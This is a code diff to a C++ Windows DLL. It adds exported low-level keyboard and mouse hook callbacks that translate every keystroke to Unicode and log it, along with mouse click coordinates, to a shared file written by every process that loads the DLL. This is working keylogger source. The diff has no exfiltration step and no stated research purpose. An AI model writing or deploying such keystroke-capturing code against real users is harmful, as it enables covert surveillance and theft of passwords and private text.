@@ -6,6 +6,8 @@
 #include <shlwapi.h> // Using PathCombine
 
 // Buffer to store the desktop folder path
+// Note: this should be an absolute path to make sure each instance 
+// of the DLL loaded by different applications log to the same file
 PWSTR desktopPath = nullptr;
 wchar_t filePath[MAX_PATH];
 
@@ -17,8 +19,6 @@ extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPA
 	if (nCode == HC_ACTION) {
 
 		std::wofstream LogFile;
-		// Note: this should be an absolute path to make sure each instance 
-		// of the DLL loaded by different applications log to the same file
 		LogFile.open(filePath, std::ios_base::app);
 
 		// check key up flag not set
@@ -45,6 +45,35 @@ extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPA
 	return CallNextHookEx(global, nCode, wParam, lParam);
 }
 
+// Similar callback function procedure for the LowLevelKeyboardProc 
+extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboardLL(int nCode, WPARAM wParam, LPARAM lParam) {
+	if (nCode == HC_ACTION) {
+
+		std::wofstream LogFile;
+		LogFile.open(filePath, std::ios_base::app);
+
+		//Extracting the data
+		KBDLLHOOKSTRUCT* data = (KBDLLHOOKSTRUCT*)lParam;
+
+		if (wParam == WM_KEYDOWN) {
+			// Get the keyboard state			
+			BYTE keyboardState[256];
+			GetKeyboardState(keyboardState);
+
+			// Buffer to store the resulting Unicode character
+			WCHAR buffer[2];
+
+			// Convert the virtual key code to Unicode
+			int result = ToUnicode(data->vkCode, data->scanCode, keyboardState, buffer, 2, 0);
+			LogFile << buffer;
+		}
+
+		// Close the file
+		LogFile.close();
+	}
+	return CallNextHookEx(global, nCode, wParam, lParam);
+}
+
 extern "C" __declspec(dllexport) LRESULT WINAPI procedureMouse(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode == HC_ACTION) {
 
@@ -53,6 +82,29 @@ extern "C" __declspec(dllexport) LRESULT WINAPI procedureMouse(int nCode, WPARAM
 
 		//Extracting the data
 		MOUSEHOOKSTRUCT* data = (MOUSEHOOKSTRUCT*)lParam;
+
+		if (wParam == WM_LBUTTONDOWN) {
+			LogFile << std::endl << "LMB:(" << data->pt.x << "," << data->pt.y << ") ";
+		}
+		else if (wParam == WM_RBUTTONDOWN) {
+			LogFile << std::endl << "RMB:(" << data->pt.x << "," << data->pt.y << ") ";
+		}
+
+		// Close the file
+		LogFile.close();
+	}
+	return CallNextHookEx(global, nCode, wParam, lParam);
+}
+
+// Similar callback function procedure for the LowLevelMouseProc 
+extern "C" __declspec(dllexport) LRESULT WINAPI procedureMouseLL(int nCode, WPARAM wParam, LPARAM lParam) {
+	if (nCode == HC_ACTION) {
+
+		std::ofstream LogFile;
+		LogFile.open(filePath, std::ios_base::app);
+
+		//Extracting the data
+		MSLLHOOKSTRUCT* data = (MSLLHOOKSTRUCT*)lParam;
 
 		if (wParam == WM_LBUTTONDOWN) {
 			LogFile << std::endl << "LMB:(" << data->pt.x << "," << data->pt.y << ") ";
